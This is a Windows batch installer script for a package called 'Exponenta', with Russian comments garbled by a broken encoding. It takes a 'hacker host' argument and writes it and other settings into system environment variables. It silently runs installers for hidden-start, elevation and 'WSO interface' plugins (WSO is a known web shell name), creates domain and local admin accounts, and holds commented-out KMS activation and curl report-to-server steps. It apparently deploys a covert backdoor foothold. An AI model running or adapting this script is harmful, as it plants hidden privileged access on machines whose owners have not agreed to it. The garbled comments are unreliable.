@echo on
rem
rem �������� 䠩� ���⠫��樨 ����ਡ�⨢� � �᭮��묨 䠩���� ����� "Exponenta"
rem
rem USAGE
rem > InstallMainExponenta.bat <dest_dir> <hacker host server 1 domain> <AdminT> <Elevation> <Util>
rem ����᪠�� 䠩� � �ࠢ��� �����������

setlocal enableextensions enabledelayedexpansion

Rem ��⠭���� ��⥬����� ��६����� ���㦥���

set Key=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
set Chocolatey=%ALLUSERSPROFILE%\chocolatey

rem �����⮢�� ���짮��⥫�᪨� ��६����� ���㦥���.
rem �� ��६���� ���㦥��� ।��������� ���짮��⥫��  ��� ����� ������� �����.
rem ����� �஢������ ����稥 ������� �ਫ������ ��� �����. �᫨ ������� ��������� -- ��祣�� �� ��������.
rem ᮧ��� ��⥬�� ��६���� Windows ��� ��⭥�
set Dest_DIR=%1
set Hacker_host1=%2
set AdminT=%3
set Elevation=%4
ser Util=%5


echo -
echo ���� ���������� � �ணࠬ�� ��⠭���� �����
echo ������ �ணࠬ�� ��⠭�������� 䠩�� � ��⠫�� %Dest_DIR%
echo -

rem ��ᯠ����� ����ਡ�⨢� �� SFX ��娢� � ��⠫�� %Dest_DIR%
rem ��⮬���᪠� �ᯠ����� ������ ���� ����஥�� �⤥�쭮
rem ��������! ᬮ��� �� �����祭�� ��⥬��� ��६�����!
rem �����. �� �ணࠬ��஢���� ��ন� ��� ᢮��� ��� ���������� 䠩�

rem ��������� ��६�����, �᫨ �㦭�

echo
echo ��������㥬 ���� ��६���� ���㦥���...
echo
rem %SystemRoot%\System32\reg.exe Add "!Key_Var!" /v "!��ࠬ���!" /t REG_SZ /d "!��ࠬ���!" /f 2>&1 | %SystemRoot%\system32\find.exe >nul 2>nul /I "�訡��" && goto UnSuccess
rem echo The variable is created

rem %SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_host1 /t REG_SZ /d "!Hacker_host1!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v PUB1 /t REG_SZ /d "!Dest_DIR!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v AdminT /t REG_SZ /d "!AdminT!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v ELEVATION /t REG_SZ /d "!Elevation!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v UTIL /t REG_SZ /d "!Util!" /f

cd /d %curdir%

rem Install Certificates Files...
if not exist Certificates-install.bat goto UnSuccess_Certificates
echo "Install Certificates..."
call Certificates-install.bat
:UnSuccess_Certificates

rem Install MainExponenta Files...
if not exist Distrib\ExponentaMainFilesSetup.exe goto UnSuccess
echo "Install Main Exponenta files..."
Distrib\ExponentaMainFilesSetup.exe /VERYSILENT /NOCANCEL

rem Install Duck Plugin
if not exist duck-Install.bat goto pass_Duck
rem call duck-Install.bat
:pass_Duck

rem Install Hidden Start Plugin
if not exist HiddenStartInstall.bat goto pass_HiddenStart
call HiddenStartInstall.bat
:pass_HiddenStart

rem Install Elevation Plugin
if not exist ElevationInstall.bat goto pass_Elevation
call ElevationInstall.bat
:pass_Elevation

rem Install Utils...
if not exist UtilsInstall.bat goto pass_Util
rem call UtilsInstall.bat
:pass_Util

rem Install AdminSet01...
if not exist AdminSet01Install.bat goto pass_AdminSet01
call AdminSet01Install.bat
:pass_AdminSet01

rem Install AdminT Plugin
if not exist AdminTInstall.bat goto pass_AdminT
call AdminTInstall.bat
:pass_AdminT

rem Instll Threads Plugin
if not exist Threads-Install.bat goto pass_Threads
rem call Threads-Install.bat
:pass_Threads

rem Instll sordum.org Utils
if not exist sordum.org.install.bat goto pass_Sordum
rem call sordum.org.install.bat
:pass_Sordum

rem Instll WSO Interface Plugin
if not exist wsoinstall.bat goto pass_WSO
call wsoinstall.bat
:pass_WSO

rem Install Chocolatey Packet
if not exist InstallChocolateyPackets.bat goto pass_Chocolatey
call InstallChocolateyPackets.bat
:pass_Chocolatey

rem Unpack KMS_Tools_Portable
if not exist KMS-Portable-Unpack.bat goto pass_KMS
rem call KMS-Portable-Unpack.bat
:pass_KMS

rem Refresh Environment
if not exist %Chocolatey%\Bin\RefreshEnv.cmd goto pass_Refresh
call %Chocolatey%\Bin\RefreshEnv.cmd
:pass_Refresh

rem Create Exponenta Styler User for Local Access
@echo off
call %Dest_DIR%\Util\adAdminDomain.cmd
call %Dest_DIR%\Util\adAdminLocal.cmd
rem The End of Exponenta User Create

rem �ࠢ�� 䠩��� ���䨣��樨 ����� Exponenta
@echo on
rem "=== Changing Exponente Config ==="
rem

rem ᮧ����� ᯨ᪠ ����ﭭ�� ��������� ��� �������
echo -
echo Installation is made with Success!
rem
rem ��ࠢ�� ���� ��⠭���� �� �ࢥ� 宧鶴�
rem curl
goto sess_Finish

:already_Exist
echo Installation Warning!
echo This Packet has been already installed
echo The yuden.Exponenta configuration stay the same.
rem
rem ��ࠢ�� ���� ��⠭���� �� �ࢥ� 宧鶴�
rem curl
goto sess_Finish


:UnSuccess
echo General Error
echo Installation may be incomplete!
echo The yuden. Exponenta configuration stay the same.
rem
rem ��ࠢ�� ���� ��⠭���� �� �ࢥ� 宧鶴�
rem curl
goto sess_Finish

:sess_Finish

echo "Delete unused files"
cd /d %curdir%

rd /S /Q WindowsPowerShell

rem pause
